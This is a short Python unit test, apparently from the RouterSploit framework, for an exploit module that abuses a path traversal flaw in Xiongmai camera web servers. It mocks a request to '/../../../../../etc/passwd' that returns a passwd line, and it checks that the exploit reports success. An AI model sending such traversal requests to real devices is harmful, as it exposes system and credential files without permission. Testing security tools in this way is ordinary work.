from routersploit.modules.exploits.cameras.xiongmai.uc_httpd_path_traversal import Exploit


def test_check_success(target):
    """ Test scenario - successful check """

    route_mock = target.get_route_mock("/../../../../../etc/passwd", methods=["GET"])
    route_mock.return_value = (
        "root:absxcfbgXtb3o:0:0:root:/:/bin/sh"
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80
    assert exploit.filename == "/etc/passwd"

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
